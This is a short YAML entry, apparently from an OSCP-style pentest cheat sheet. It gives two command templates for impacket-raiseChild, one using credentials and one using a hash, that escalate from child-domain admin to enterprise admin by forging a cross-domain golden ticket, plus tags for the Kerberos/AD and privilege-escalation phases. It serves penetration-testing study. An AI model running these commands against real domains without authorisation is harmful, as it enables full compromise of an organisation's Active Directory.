---
variants:
  - label: creds
    command: |
      impacket-raiseChild -target-exec $IP $DOMAIN/$USER:$PASSWORD
  - label: hash
    command: |
      impacket-raiseChild -target-exec $IP -hashes :$HASH $DOMAIN/$USER
description: Escalate from child domain admin to enterprise admin by forging a cross domain golden ticket
os: [Linux]
category: [oscp, cli]
have: [hash]
service: [Kerberos, AD]
phase: [PrivEsc, LateralMovement]
references:
  - https://github.com/fortra/impacket
---
